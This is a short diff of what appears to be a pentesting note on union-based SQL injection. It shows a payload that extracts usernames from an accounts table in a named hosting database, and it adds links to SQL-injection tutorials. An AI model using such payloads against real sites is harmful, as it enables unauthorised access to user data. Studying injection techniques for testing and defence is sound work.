@@ -21,3 +21,7 @@ or
 ```
 'union select 1,2,3,4,(SELECT username from host1244535_siska.accounts ),version(),7 -- -
 ```
+
+ref:-
+https://www.hackingloops.com/sql-injection-union-based-exploitation-part-2-the-injection/
+https://book.hacktricks.xyz/pentesting-web/sql-injection
